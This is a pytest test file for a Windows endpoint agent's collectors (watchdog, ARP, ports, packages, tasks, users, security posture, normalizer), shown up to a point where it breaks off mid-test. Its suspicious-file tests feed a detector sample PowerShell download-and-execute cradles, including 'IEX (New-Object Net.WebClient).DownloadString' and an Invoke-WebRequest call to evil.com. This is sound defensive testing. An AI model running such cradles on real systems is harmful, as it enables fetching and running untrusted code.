"""
agent/tests/unit/test_windows_collectors.py

Comprehensive cross-platform tests for the Windows collector layer.
All tests mock platform-specific APIs (winreg, psutil, subprocess) so they
run on macOS/Linux CI without any Windows dependencies.

Coverage
────────
1.  WatchdogCore   — sliding-window rate limiter, stop-event, agent health check
2.  ConfigsCollector._check — every suspicious-file pattern + clean paths
3.  ArpCollector   — MAC normalisation, broadcast filtering, IP validation
4.  PortsCollector — UDP/TCP/IPv6 protocol tagging
5.  BinariesCollector — _sha256_partial helper, dir-skip logic
6.  TasksCollector CSV fallback — fields with embedded commas (csv.reader fix)
7.  SysctlCollector — winreg unavailable path returns []
8.  _HKLM regression — module-level handle is not None when winreg is present
9.  SecurityCollector — registry check results plumbed through collect()
10. WinBaseCollector._run — CREATE_NO_WINDOW flag, timeout, missing binary
11. PackagesCollector — each package-manager parse path
12. StorageCollector / MountsCollector — psutil fallback logic
13. UsersCollector — PowerShell date parser, admin membership
14. Normalizer coverage for sections not yet tested (hardware, containers,
    battery, openfiles, mounts, arp, configs, binaries, sbom)
"""
from __future__ import annotations

import csv
import io
import os
import sys
import tempfile
import threading
import time
from types import SimpleNamespace
from unittest.mock import MagicMock, patch, call

import pytest

# Make project root importable from any working directory
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(
    os.path.dirname(os.path.abspath(__file__))
))))

# ── lazy imports so the module itself is the unit under test ──────────────────


# ═══════════════════════════════════════════════════════════════════════════════
# 1. WatchdogCore
# ═══════════════════════════════════════════════════════════════════════════════

class TestWatchdogCoreRateLimit:
    """Sliding-window restart rate limiter."""

    def _make_core(self, stop_event=None):
        from agent.os.windows.watchdog_svc import WatchdogCore
        core = WatchdogCore(stop_event=stop_event)
        return core

    def test_under_limit_allowed(self):
        core = self._make_core()
        # Inject MAX_RESTARTS - 1 timestamps well inside the window
        from agent.os.windows import watchdog_svc as ws
        now = time.time()
        for _ in range(ws.MAX_RESTARTS - 1):
            core._restarts.append(now)

        with patch.object(core, "_start_agent_service") as start_mock, \
             patch.object(core, "_event_log_error"):
            core._attempt_restart()

        start_mock.assert_called_once()

    def test_rate_limit_triggered(self):
        core = self._make_core()
        from agent.os.windows import watchdog_svc as ws
        now = time.time()
        # Fill window to the limit
        for _ in range(ws.MAX_RESTARTS):
            core._restarts.append(now)

        with patch.object(core, "_start_agent_service") as start_mock, \
             patch.object(core, "_event_log_error") as err_mock, \
             patch.object(core, "_sleep"):          # don't actually sleep
            core._attempt_restart()

        err_mock.assert_called_once()
        # After the back-off the window is cleared, so restart is tried once
        start_mock.assert_called_once()

    def test_old_timestamps_evicted(self):
        """Timestamps outside RESTART_WINDOW_SEC must not count."""
        core = self._make_core()
        from agent.os.windows import watchdog_svc as ws
        old = time.time() - ws.RESTART_WINDOW_SEC - 1
        for _ in range(ws.MAX_RESTARTS):
            core._restarts.append(old)

        with patch.object(core, "_start_agent_service") as start_mock, \
             patch.object(core, "_event_log_error"):
            core._attempt_restart()

        start_mock.assert_called_once()

    def test_stop_event_prevents_loop(self):
        """WatchdogCore.run() must exit promptly when stop_event is set."""
        stop = threading.Event()
        core = self._make_core(stop_event=stop)

        with patch.object(core, "_is_agent_running", return_value=True), \
             patch.object(core, "_sleep", side_effect=lambda _: stop.set()):
            core.run()   # should return without hanging

    def test_is_agent_running_without_win32(self):
        """Without pywin32, _is_agent_running returns True (optimistic)."""
        from agent.os.windows import watchdog_svc as ws
        orig = ws._HAS_WIN32
        ws._HAS_WIN32 = False
        try:
            core = ws.WatchdogCore()
            assert core._is_agent_running() is True
        finally:
            ws._HAS_WIN32 = orig


# ═══════════════════════════════════════════════════════════════════════════════
# 2. ConfigsCollector._check — suspicious-file patterns
# ═══════════════════════════════════════════════════════════════════════════════

class TestConfigsCheck:
    """All suspicious / clean paths for every file type."""

    def _check(self, ftype, text, path="dummy"):
        from agent.os.windows.collectors.posture import ConfigsCollector
        return ConfigsCollector._check(ftype, text, path)

    # hosts
    def test_hosts_loopback_clean(self):
        text = "127.0.0.1 localhost\n::1 localhost\n"
        sus, note = self._check("hosts", text)
        assert sus is False
        assert note is None

    def test_hosts_non_loopback_suspicious(self):
        text = "127.0.0.1 localhost\n10.0.0.1 evil.corp\n"
        sus, note = self._check("hosts", text)
        assert sus is True
        assert "Non-loopback" in note

    def test_hosts_comment_skipped(self):
        text = "# 192.168.1.1 should be ignored\n127.0.0.1 localhost\n"
        sus, note = self._check("hosts", text)
        assert sus is False

    # authorized_keys
    def test_authorized_keys_empty_clean(self):
        sus, note = self._check("authorized_keys", "")
        assert sus is False

    def test_authorized_keys_with_content_suspicious(self):
        sus, note = self._check("authorized_keys", "ssh-rsa AAAA...")
        assert sus is True
        assert "authorized_keys" in note

    # shell_rc (PowerShell profile)
    @pytest.mark.parametrize("payload,expected_fragment", [
        ("IEX (New-Object Net.WebClient).DownloadString('http://x')", "IEX"),
        ("$wc = New-Object System.Net.WebClient; $wc.DownloadString('http://x')", "DownloadString"),
        ("$wc = New-Object System.Net.WebClient", "WebClient"),
        ("[System.Convert]::FromBase64String('abc')", "Base64"),
        ("Invoke-WebRequest http://evil.com -Exec cmd", "Invoke-WebRequest"),
    ])
    def test_ps_profile_malicious_patterns(self, payload, expected_fragment):
        sus, note = self._check("shell_rc", payload)
        assert sus is True, f"Expected suspicious for: {payload}"
        assert expected_fragment.lower() in note.lower()

    def test_ps_profile_clean(self):
        text = "Set-PSReadLineOption -EditMode Vi\n$env:PATH += ';C:\\tools'\n"
        sus, note = self._check("shell_rc", text)
        assert sus is False

    # ssh_config
    def test_sshd_permitrootlogin_yes_suspicious(self):
        sus, note = self._check("ssh_config", "PermitRootLogin yes\n")
        assert sus is True
        assert "PermitRootLogin" in note

    def test_sshd_passwordauth_yes_suspicious(self):
        sus, note = self._check("ssh_config", "PasswordAuthentication yes\n")
        assert sus is True

    def test_sshd_permitrootlogin_no_clean(self):
        sus, note = self._check("ssh_config", "PermitRootLogin no\n")
        assert sus is False

    def test_unknown_ftype_clean(self):
        sus, note = self._check("unknown_type", "anything here")
        assert sus is False
        assert note is None


# ═══════════════════════════════════════════════════════════════════════════════
# 3. ArpCollector — output parsing
# ═══════════════════════════════════════════════════════════════════════════════

class TestArpCollector:
    """Test ARP table parsing without spawning real processes."""

    _SAMPLE_OUTPUT = """\
Interface: 192.168.1.5 --- 0xb
  Internet Address      Physical Address      Type
  192.168.1.1           aa-bb-cc-dd-ee-ff     dynamic
  192.168.1.255         ff-ff-ff-ff-ff-ff     static
  10.0.0.3              00-11-22-33-44-55     dynamic
"""

    def _make_collector(self):
        from agent.os.windows.collectors.network import ArpCollector
        return ArpCollector()

    def test_mac_normalized_to_colon(self):
        c = self._make_collector()
        with patch.object(c, "_run", return_value=self._SAMPLE_OUTPUT):
            result = c.collect()
        # 192.168.1.1 entry
        entry = next(e for e in result if e["ip"] == "192.168.1.1")
        assert entry["mac"] == "aa:bb:cc:dd:ee:ff"

    def test_broadcast_mac_filtered(self):
        c = self._make_collector()
        with patch.object(c, "_run", return_value=self._SAMPLE_OUTPUT):
            result = c.collect()
        broadcast = [e for e in result if e["ip"] == "192.168.1.255"]
        # broadcast entry present but mac is None
        assert len(broadcast) == 1
        assert broadcast[0]["mac"] is None

    def test_interface_header_tracked(self):
        c = self._make_collector()
        with patch.object(c, "_run", return_value=self._SAMPLE_OUTPUT):
            result = c.collect()
        assert all(e["interface"] == "192.168.1.5" for e in result)

    def test_invalid_ip_lines_skipped(self):
        bad = "Interface: 10.0.0.1 --- 0xa\n  not.an.ip  aa-bb-cc-dd-ee-ff  dynamic\n"
        c = self._make_collector()
        with patch.object(c, "_run", return_value=bad):
            result = c.collect()
        assert result == []

    def test_empty_output_returns_empty_list(self):
        c = self._make_collector()
        with patch.object(c, "_run", return_value=""):
            result = c.collect()
        assert result == []


# ═══════════════════════════════════════════════════════════════════════════════
# 4. PortsCollector — protocol detection
# ═══════════════════════════════════════════════════════════════════════════════

class TestPortsCollector:
    def _make_collector(self):
        from agent.os.windows.collectors.network import PortsCollector
        return PortsCollector()

    def _fake_conn(self, status, laddr_port, ctype="STREAM", family="AF_INET", pid=1):
        c = MagicMock()
        c.status = status
        c.laddr  = SimpleNamespace(ip="0.0.0.0", port=laddr_port)
        c.raddr  = None
        c.type   = MagicMock()
        c.type.__str__ = lambda _: f"SocketKind.SOCK_{ctype}"
        c.family = MagicMock()
        c.family.__str__ = lambda _: f"AddressFamily.{family}"
        c.pid    = pid
        return c

    def test_listen_tcp_captured(self):
        conn = self._fake_conn("LISTEN", 8443)
        c = self._make_collector()
        with patch("psutil.net_connections", return_value=[conn]), \
             patch("psutil.process_iter", return_value=[]):
            result = c.collect()
        assert any(p["port"] == 8443 and p["proto"] == "tcp" for p in result)

    def test_established_skipped(self):
        conn = self._fake_conn("ESTABLISHED", 12345)
        c = self._make_collector()
        with patch("psutil.net_connections", return_value=[conn]), \
             patch("psutil.process_iter", return_value=[]):
            result = c.collect()
        assert result == []

    def test_udp_detected(self):
        conn = self._fake_conn("", 53, ctype="DGRAM")
        conn.laddr = SimpleNamespace(ip="0.0.0.0", port=53)
        c = self._make_collector()
        with patch("psutil.net_connections", return_value=[conn]), \
             patch("psutil.process_iter", return_value=[]):
            result = c.collect()
        assert any(p["proto"] in ("udp", "udp6") for p in result)

    def test_no_laddr_skipped(self):
        conn = self._fake_conn("LISTEN", 80)
        conn.laddr = None
        c = self._make_collector()
        with patch("psutil.net_connections", return_value=[conn]), \
             patch("psutil.process_iter", return_value=[]):
            result = c.collect()
        assert result == []


# ═══════════════════════════════════════════════════════════════════════════════
# 5. BinariesCollector — helpers
# ═══════════════════════════════════════════════════════════════════════════════

class TestBinariesCollector:
    def test_sha256_partial_known_value(self, tmp_path):
        import hashlib
        from agent.os.windows.collectors.inventory import _sha256_partial
        data = b"hello windows agent"
        fpath = tmp_path / "test.bin"
        fpath.write_bytes(data)
        expected = hashlib.sha256(data).hexdigest()
        assert _sha256_partial(str(fpath), 4096) == expected

    def test_sha256_partial_returns_none_on_missing_file(self):
        from agent.os.windows.collectors.inventory import _sha256_partial
        assert _sha256_partial("/nonexistent/path/file.exe", 4096) is None

    def test_sha256_partial_cap_respected(self, tmp_path):
        import hashlib
        from agent.os.windows.collectors.inventory import _sha256_partial
        data = b"A" * 200
        fpath = tmp_path / "large.bin"
        fpath.write_bytes(data)
        cap = 10
        expected = hashlib.sha256(data[:cap]).hexdigest()
        assert _sha256_partial(str(fpath), cap) == expected

    def test_collect_skips_non_exe(self, tmp_path):
        from agent.os.windows.collectors.inventory import BinariesCollector
        # Create a .dll and a .exe in the scan dir
        (tmp_path / "lib.dll").write_bytes(b"DLL")
        (tmp_path / "tool.exe").write_bytes(b"EXE")

        c = BinariesCollector()
        c._SCAN_DIRS = [str(tmp_path)]
        result = c.collect()
        names = [r["name"] for r in result]
        assert "tool.exe" in names
        assert "lib.dll" not in names

    def test_collect_respects_max_files(self, tmp_path):
        from agent.os.windows.collectors.inventory import BinariesCollector
        for i in range(10):
            (tmp_path / f"prog{i}.exe").write_bytes(b"EXE")

        c = BinariesCollector()
        c._SCAN_DIRS = [str(tmp_path)]
        c._MAX_FILES = 3
        result = c.collect()
        assert len(result) == 3


# ═══════════════════════════════════════════════════════════════════════════════
# 6. TasksCollector CSV fallback — embedded commas
# ═══════════════════════════════════════════════════════════════════════════════

class TestTasksCsvFallback:
    """Verify that csv.reader correctly handles quoted commas in task fields."""

    def _make_csv(self, rows: list[list[str]]) -> str:
        buf = io.StringIO()
        writer = csv.writer(buf, quoting=csv.QUOTE_ALL)
        for row in rows:
            writer.writerow(row)
        return buf.getvalue()

    def test_command_with_embedded_comma(self):
        from agent.os.windows.collectors.inventory import TasksCollector

        header = ["HostName", "TaskName", "Next Run Time", "Status",
                  "Logon Mode", "Last Run Time", "Last Result",
                  "Author", "Task To Run", "Start In", "Comment",
                  "Scheduled Task State", "Idle Time", "Power Management",
                  "Run As User", "Delete Task If Not Rescheduled",
                  "Stop Task If Runs X Hours and X Mins", "Schedule",
                  "Schedule Type", "Start Time", "Start Date", "End Date",
                  "Days", "Months", "Repeat: Every", "Repeat: Until: Time",
                  "Repeat: Until: Duration", "Repeat: Stop If Still Running"]
        # Task To Run has an embedded comma
        row = ["MYHOST", r"\Folder\MyTask", "N/A", "Ready",
               "Interactive/Background only", "N/A", "0",
               "SYSTEM", 'cmd.exe /c "echo hello, world"', "",
               "Some comment, with comma", "Enabled", "Disabled",
               "Stop On Battery Mode, No Start On Batteries",
               "SYSTEM", "Disabled", "72:00:00",
               "Scheduling data is not available in this format.",
               "Daily", "12:00:00", "1/1/2026", "12/31/2026",
               "Every week", "Every 1 week(s)", "Disabled", "Disabled",
               "Disabled", "Disabled"]
        csv_output = self._make_csv([header, row])

        c = TasksCollector()
        # Force PS to fail so fallback triggers
        with patch.object(c, "_run_ps", return_value="INVALID_JSON"), \
             patch.object(c, "_run", return_value=csv_output):
            result = c.collect()

        assert len(result) == 1
        assert result[0]["command"] == 'cmd.exe /c "echo hello, world"'
        assert result[0]["enabled"] is True
        assert result[0]["name"] == r"\Folder\MyTask"

    def test_disabled_task_not_enabled(self):
        from agent.os.windows.collectors.inventory import TasksCollector

        header = ["HostName", "TaskName", "Status", "Task To Run",
                  "Schedule Type", "Run As User"]
        row    = ["HOST", r"\MyTask", "Disabled", "notepad.exe", "Daily", "SYSTEM"]
        csv_output = self._make_csv([header, row])

        c = TasksCollector()
        with patch.object(c, "_run_ps", return_value="{}"), \
             patch.object(c, "_run", return_value=csv_output):
            result = c.collect()

        assert len(result) == 1
        assert result[0]["enabled"] is False

    def test_empty_csv_returns_no_tasks(self):
        from agent.os.windows.collectors.inventory import TasksCollector
        c = TasksCollector()
        with patch.object(c, "_run_ps", return_value="NOT_JSON"), \
             patch.object(c, "_run", return_value=""):
            result = c.collect()
        assert result == []


# ═══════════════════════════════════════════════════════════════════════════════
# 7. SysctlCollector — winreg not available
# ═══════════════════════════════════════════════════════════════════════════════

class TestSysctlCollector:
    def test_returns_empty_when_winreg_missing(self):
        from agent.os.windows.collectors.posture import SysctlCollector
        c = SysctlCollector()
        with patch.dict("sys.modules", {"winreg": None}):
            result = c.collect()
        assert result == []

    def test_returns_list_of_records(self):
        from agent.os.windows.collectors.posture import SysctlCollector
        c = SysctlCollector()
        mock_winreg = MagicMock()
        mock_winreg.HKEY_LOCAL_MACHINE = 0x80000002
        mock_winreg.KEY_READ = 1
        mock_winreg.KEY_WOW64_64KEY = 0x100
        # reg_get will return {"EnableLUA": 1} for the first path
        with patch.dict("sys.modules", {"winreg": mock_winreg}), \
             patch.object(c, "reg_get", return_value={"EnableLUA": "1"}):
            result = c.collect()
        assert isinstance(result, list)
        assert all(isinstance(r, dict) for r in result)
        assert all("key" in r and "value" in r for r in result)


# ═══════════════════════════════════════════════════════════════════════════════
# 8. _HKLM regression — must not be None when winreg is present
# ═══════════════════════════════════════════════════════════════════════════════

class TestHklmRegression:
    """Regression test for the _HKLM = None bug fixed in posture.py."""

    def test_hklm_is_none_on_non_windows(self):
        """On non-Windows CI (no winreg), _HKLM must be None — reg_get handles it."""
        import importlib
        import agent.os.windows.collectors.posture as posture
        # On macOS/Linux winreg is absent → _HKLM should be None
        if sys.platform != "win32":
            assert posture._HKLM is None

    def test_hklm_is_correct_handle_when_winreg_available(self):
        """When winreg IS available, _HKLM must equal HKEY_LOCAL_MACHINE."""
        mock_winreg = MagicMock()
        mock_winreg.HKEY_LOCAL_MACHINE = 0x80000002

        with patch.dict("sys.modules", {"winreg": mock_winreg}):
            import importlib
            import agent.os.windows.collectors.posture as posture
            importlib.reload(posture)
            assert posture._HKLM == 0x80000002

    def test_uac_called_with_non_none_hive_on_windows(self):
        """SecurityCollector._uac() must pass a non-None hive to reg_get on Windows."""
        from agent.os.windows.collectors.posture import SecurityCollector
        c = SecurityCollector()
        calls: list = []

        def fake_reg_get(hive, path, name=None):
            calls.append(hive)
            return 1  # EnableLUA = 1 → "enabled"

        with patch.object(type(c), "reg_get", staticmethod(fake_reg_get)):
            import agent.os.windows.collectors.posture as posture
            orig_hklm = posture._HKLM
            posture._HKLM = 0x80000002   # simulate Windows
            try:
                result = c._uac()
            finally:
                posture._HKLM = orig_hklm

        assert calls, "reg_get was never called"
        assert calls[0] == 0x80000002, (
            f"_HKLM must be 0x80000002, got {calls[0]!r} — "
            "this is a regression of the _HKLM=None bug"
        )
        assert result == "enabled"


# ═══════════════════════════════════════════════════════════════════════════════
# 9. SecurityCollector — collect() output shape
# ═══════════════════════════════════════════════════════════════════════════════

class TestSecurityCollector:
    def _make_collector(self):
        from agent.os.windows.collectors.posture import SecurityCollector
        return SecurityCollector()

    def test_collect_returns_required_keys(self):
        c = self._make_collector()
        with patch.object(c, "_defender", return_value=("enabled", True)), \
             patch.object(c, "_uac", return_value="enabled"), \
             patch.object(c, "_bitlocker", return_value="on"), \
             patch.object(c, "_firewall", return_value="on"), \
             patch.object(c, "_secure_boot", return_value="full"), \
             patch.object(c, "_auto_update", return_value=True), \
             patch.object(c, "_credential_guard", return_value=True), \
             patch.object(c, "_wdac", return_value=None), \
             patch.object(c, "_smb1", return_value=False), \
             patch.object(c, "_lsass_ppl", return_value=True), \
             patch.object(c, "_last_patch_age", return_value=5):
            out = c.collect()

        required = ["sip", "gatekeeper", "filevault", "xprotect",
                    "firewall", "secure_boot", "av_installed", "av_product",
                    "os_patched", "auto_update", "selinux", "apparmor",
                    "ufw", "uac", "bitlocker", "defender", "_raw"]
        for key in required:
            assert key in out, f"Missing key: {key}"

    def test_macos_linux_fields_always_none(self):
        c = self._make_collector()
        with patch.object(c, "_defender", return_value=("unknown", False)), \
             patch.object(c, "_uac", return_value=None), \
             patch.object(c, "_bitlocker", return_value="off"), \
             patch.object(c, "_firewall", return_value="off"), \
             patch.object(c, "_secure_boot", return_value=None), \
             patch.object(c, "_auto_update", return_value=None), \
             patch.object(c, "_credential_guard", return_value=None), \
             patch.object(c, "_wdac", return_value=None), \
             patch.object(c, "_smb1", return_value=None), \
             patch.object(c, "_lsass_ppl", return_value=None), \
             patch.object(c, "_last_patch_age", return_value=None):
            out = c.collect()

        for field in ("sip", "gatekeeper", "filevault", "xprotect",
                      "selinux", "apparmor", "ufw"):
            assert out[field] is None, f"{field} must be None on Windows"

    def test_os_patched_true_when_recent_hotfix(self):
        c = self._make_collector()
        with patch.object(c, "_defender", return_value=("enabled", True)), \
             patch.object(c, "_uac", return_value="enabled"), \
             patch.object(c, "_bitlocker", return_value="off"), \
             patch.object(c, "_firewall", return_value="on"), \
             patch.object(c, "_secure_boot", return_value="full"), \
             patch.object(c, "_auto_update", return_value=True), \
             patch.object(c, "_credential_guard", return_value=None), \
             patch.object(c, "_wdac", return_value=None), \
             patch.object(c, "_smb1", return_value=None), \
             patch.object(c, "_lsass_ppl", return_value=None), \
             patch.object(c, "_last_patch_age", return_value=10):   # 10 days ≤ 30
            out = c.collect()
        assert out["os_patched"] is True

    def test_os_patched_false_when_stale(self):
        c = self._make_collector()
        with patch.object(c, "_defender", return_value=("disabled", False)), \
             patch.object(c, "_uac", return_value=None), \
             patch.object(c, "_bitlocker", return_value="off"), \
             patch.object(c, "_firewall", return_value="off"), \
             patch.object(c, "_secure_boot", return_value=None), \
             patch.object(c, "_auto_update", return_value=None), \
             patch.object(c, "_credential_guard", return_value=None), \
             patch.object(c, "_wdac", return_value=None), \
             patch.object(c, "_smb1", return_value=None), \
             patch.object(c, "_lsass_ppl", return_value=None), \
             patch.object(c, "_last_patch_age", return_value=60):   # > 30
            out = c.collect()
        assert out["os_patched"] is False


# ═══════════════════════════════════════════════════════════════════════════════
# 10. WinBaseCollector._run — subprocess interaction
# ═══════════════════════════════════════════════════════════════════════════════

class TestWinBaseCollectorRun:
    def _make_base(self):
        from agent.os.windows.collectors.base import WinBaseCollector, CREATE_NO_WINDOW
        # Concrete subclass for testing
        class _Concrete(WinBaseCollector):
            name = "test"
            def collect(self): return {}
        return _Concrete(), CREATE_NO_WINDOW

    def test_run_returns_stdout(self):
        c, CNW = self._make_base()
        mock_result = MagicMock()
        mock_result.stdout = "hello\n"
        with patch("subprocess.run", return_value=mock_result) as run_mock:
            out = c._run(["echo", "hello"])
        assert out == "hello\n"
        run_mock.assert_called_once()
        kwargs = run_mock.call_args.kwargs
        assert kwargs["creationflags"] == CNW

    def test_run_returns_empty_on_file_not_found(self):
        c, _ = self._make_base()
        with patch("subprocess.run", side_effect=FileNotFoundError):
            out = c._run(["nosuchcmd"])
        assert out == ""

    def test_run_returns_empty_on_timeout(self):
        import subprocess
        c, _ = self._make_base()
        with patch("subprocess.run", side_effect=subprocess.TimeoutExpired("cmd", 5)):
            out = c._run(["slow_cmd"])
        assert out == ""

    def test_run_ps_uses_powershell(self):
        c, CNW = self._make_base()
        with patch.object(c, "_run", return_value="ps_output") as run_mock:
            out = c._run_ps("Get-Date")
        run_mock.assert_called_once()
        cmd = run_mock.call_args.args[0]
        assert cmd[0] == "powershell.exe"
        assert "-Command" in cmd
        assert "Get-Date" in cmd

    def test_run_ps_bypass_execution_policy(self):
        c, _ = self._make_base()
        with patch.object(c, "_run", return_value="") as run_mock:
            c._run_ps("anything")
        cmd = run_mock.call_args.args[0]
        assert "-ExecutionPolicy" in cmd
        assert "Bypass" in cmd


# ═══════════════════════════════════════════════════════════════════════════════
# 11. PackagesCollector — per-manager parse paths
# ═══════════════════════════════════════════════════════════════════════════════

class TestPackagesCollector:
    def _make_collector(self):
        from agent.os.windows.collectors.inventory import PackagesCollector
        return PackagesCollector()

    def test_pip_parse(self):
        import json
        c = self._make_collector()
        pip_json = json.dumps([{"name": "requests", "version": "2.31.0"},
                                {"name": "psutil",   "version": "5.9.0"}])
        with patch.object(c, "_run", return_value=pip_json):
            result = c._pip()
        assert len(result) == 2
        assert result[0]["manager"] == "pip"
        assert result[0]["name"] == "requests"

    def test_pip_bad_json_returns_empty(self):
        c = self._make_collector()
        with patch.object(c, "_run", return_value="not json"):
            assert c._pip() == []

    def test_choco_parse(self):
        c = self._make_collector()
        with patch.object(c, "_run", return_value="git|2.43.0\npython|3.11.8\n"):
            result = c._choco()
        assert len(result) == 2
        assert result[0]["manager"] == "choco"
        assert result[0]["name"] == "git"
        assert result[0]["version"] == "2.43.0"

    def test_scoop_parse(self):
        c = self._make_collector()
        scoop_out = "  Name   Version  Source\n  ----   -------  ------\n  git    2.43.0   main\n"
        with patch.object(c, "_run", return_value=scoop_out):
            result = c._scoop()
        assert any(p["name"] == "git" for p in result)

    def test_winget_parse(self):
        # winget list columns: Name | Id | Version | Available | Source
        c = self._make_collector()
        winget_out = (
            "Name             Id                         Version    Available  Source\n"
            "--------------------------------------------------------------------------\n"
            "PowerShell       Microsoft.PowerShell       7.4.0                 winget\n"
            "Git              Git.Git                    2.43.0                winget\n"
        )
        with patch.object(c, "_run", return_value=winget_out):
            result = c._winget()
        assert any(p["name"] == "PowerShell" for p in result)
        # version is the 3rd column (index 2), not the Id (index 1)
        assert any(p["version"] == "2.43.0" for p in result)
        assert any(p["version"] == "7.4.0" for p in result)


# ═══════════════════════════════════════════════════════════════════════════════
# 12. StorageCollector + MountsCollector — psutil integration
# ═══════════════════════════════════════════════════════════════════════════════

class TestStorageCollector:
    def test_basic_partition(self):
        from agent.os.windows.collectors.inventory import StorageCollector
        c = StorageCollector()
        part = SimpleNamespace(device="C:\\", mountpoint="C:\\",
                               fstype="NTFS", opts="rw")
        usage = SimpleNamespace(total=250_000_000_000, used=120_000_000_000,
                                free=130_000_000_000, percent=48.0)
        with patch("psutil.disk_partitions", return_value=[part]), \
             patch("psutil.disk_usage", return_value=usage):
            result = c.collect()
        assert len(result) == 1
        assert result[0]["fstype"] == "NTFS"
        assert result[0]["pct"] == 48.0

    def test_permission_error_skipped(self):
        from agent.os.windows.collectors.inventory import StorageCollector
        c = StorageCollector()
        part = SimpleNamespace(device="D:\\", mountpoint="D:\\",
                               fstype="NTFS", opts="ro")
        with patch("psutil.disk_partitions", return_value=[part]), \
             patch("psutil.disk_usage", side_effect=PermissionError):
            result = c.collect()
        assert result == []


class TestMountsCollector:
    def test_local_volume_captured(self):
        from agent.os.windows.collectors.network import MountsCollector
        c = MountsCollector()
        part = SimpleNamespace(device="C:\\", mountpoint="C:\\",
                               fstype="NTFS", opts="rw")
        with patch("psutil.disk_partitions", return_value=[part]), \
             patch.object(c, "_run", return_value=""):
            result = c.collect()
        assert any(m["device"] == "C:\\" for m in result)

    def test_network_share_captured(self):
        from agent.os.windows.collectors.network import MountsCollector
        c = MountsCollector()
        net_use_out = (
            "New connections will be remembered.\n\n"
            "Status       Local     Remote                    Network\n"
            "-------------------------------------------------------------------------------\n"
            "OK           Z:        \\\\server\\share            Microsoft Windows Network\n"
        )
        with patch("psutil.disk_partitions", return_value=[]), \
             patch.object(c, "_run", return_value=net_use_out):
            result = c.collect()
        unc = [m for m in result if m["fstype"] == "cifs"]
        assert len(unc) == 1
        assert unc[0]["device"] == "\\\\server\\share"


# ═══════════════════════════════════════════════════════════════════════════════
# 13. UsersCollector — PowerShell date parsing & admin membership
# ═══════════════════════════════════════════════════════════════════════════════

class TestUsersCollector:
    import json as _json

    def _make_collector(self):
        from agent.os.windows.collectors.system import UsersCollector
        return UsersCollector()

    def test_powershell_datetime_parsed(self):
        import json
        c = self._make_collector()
        # Simulate /Date(ms)/ format from PowerShell JSON serialiser
        ts_ms = 1700000000 * 1000
        ps_users_out = json.dumps([{
            "Name": "Alice", "Enabled": True,
            "LastLogon": f"/Date({ts_ms})/",
        }])
        with patch.object(c, "_run_ps", return_value=ps_users_out), \
             patch("psutil.users", return_value=[]):
            result = c.collect()
        assert len(result) == 1
        assert result[0]["name"] == "Alice"
        assert result[0]["last_login"] == 1700000000

    def test_admin_membership_flagged(self):
        import json
        c = self._make_collector()
        ps_users_out = json.dumps([{"Name": "admin1", "Enabled": True, "LastLogon": None}])
        # admins group returns ["DESKTOP\\admin1"]
        adm_out = json.dumps(["DESKTOP\\admin1"])

        call_count = {"n": 0}
        def fake_run_ps(script):
            call_count["n"] += 1
            if "Get-LocalGroupMember" in script:
                return adm_out
            return ps_users_out

        with patch.object(c, "_run_ps", side_effect=fake_run_ps), \
             patch("psutil.users", return_value=[]):
            result = c.collect()

        admins = [u for u in result if u["admin"]]
        assert len(admins) == 1
        assert admins[0]["name"] == "admin1"

    def test_locked_account_detected(self):
        import json
        c = self._make_collector()
        ps_users_out = json.dumps([{"Name": "guest", "Enabled": False, "LastLogon": None}])
        with patch.object(c, "_run_ps", return_value=ps_users_out), \
             patch("psutil.users", return_value=[]):
            result = c.collect()
        assert len(result) == 1
        assert result[0]["locked"] is True


# ═══════════════════════════════════════════════════════════════════════════════
# 14. Normalizer coverage — sections not in test_windows_normalizer.py
# ═══════════════════════════════════════════════════════════════════════════════

class TestNormalizerAdditional:
    def _n(self, section, raw):
        from agent.os.windows.normalizer import normalize
        return normalize(section, raw)

    # hardware
    def test_hardware_record(self):
        raw = [{"bus": "usb", "name": "Logitech Mouse", "vendor": "Logitech",
                "product_id": "C52F", "vendor_id": "046D", "serial": None,
                "connected": True}]
        out = self._n("hardware", raw)
        assert out[0]["connected"] is True
        assert out[0]["vendor"] == "Logitech"

    def test_hardware_empty_list(self):
        assert self._n("hardware", []) == []

    # containers
    def test_container_id_truncated(self):
        raw = [{"id": "abcdef1234567890", "name": "web", "image": "nginx",
                "status": "running", "runtime": "docker",
                "ports": ["80/tcp"], "created_at": 1700000000}]
        out = self._n("containers", raw)
        assert len(out[0]["id"]) == 12   # truncated to 12

    def test_container_status_lowercased(self):
        raw = [{"id": "abc", "name": "db", "image": "postgres",
                "status": "RUNNING", "runtime": "docker",
                "ports": [], "created_at": None}]
        out = self._n("containers", raw)
        assert out[0]["status"] == "running"

    # battery
    def test_battery_present(self):
        raw = {"present": True, "charging": True, "charge_pct": 80,
               "cycle_count": None, "condition": "Normal",
               "capacity_mah": 5000, "design_mah": 5100, "voltage_mv": 12000}
        out = self._n("battery", raw)
        assert out["present"] is True
        assert out["charge_pct"] == 80

    def test_battery_bool_coercion(self):
        raw = {"present": 1, "charging": "true", "charge_pct": None}
        out = self._n("battery", raw)
        assert out["present"] is True
        assert out["charging"] is True

    # openfiles
    def test_openfiles_record(self):
        raw = [{"pid": 500, "process": "explorer.exe", "fd_count": 300, "user": "Alice"}]
        out = self._n("openfiles", raw)
        assert out[0]["fd_count"] == 300
        assert out[0]["process"] == "explorer.exe"

    # mounts
    def test_mounts_record(self):
        raw = [{"device": "C:\\", "mountpoint": "C:\\", "fstype": "NTFS", "options": "rw"}]
        out = self._n("mounts", raw)
        assert out[0]["device"] == "C:\\"

    # arp
    def test_arp_record(self):
        raw = [{"ip": "192.168.1.1", "mac": "aa:bb:cc:dd:ee:ff",
                "interface": "eth0", "state": "dynamic"}]
        out = self._n("arp", raw)
        assert out[0]["mac"] == "aa:bb:cc:dd:ee:ff"

    def test_arp_missing_ip_skipped(self):
        raw = [{"ip": "", "mac": "aa:bb:cc:dd:ee:ff", "interface": "eth0", "state": "dynamic"}]
        out = self._n("arp", raw)
        assert out == []

    # configs
    def test_configs_record(self):
        raw = [{"path": r"C:\Windows\System32\drivers\etc\hosts",
                "type": "hosts", "hash": "abc123", "size_bytes": 824,
                "modified_at": 1700000000, "suspicious": False, "note": None}]
        out = self._n("configs", raw)
        assert out[0]["path"] == r"C:\Windows\System32\drivers\etc\hosts"
        assert out[0]["owner"] is None      # Windows — no getpwuid
        assert out[0]["permissions"] is None

    def test_configs_empty_path_skipped(self):
        raw = [{"path": "", "type": "hosts", "hash": None}]
        out = self._n("configs", raw)
        assert out == []

    # binaries
    def test_binaries_record(self):
        raw = [{"path": r"C:\Windows\System32\cmd.exe",
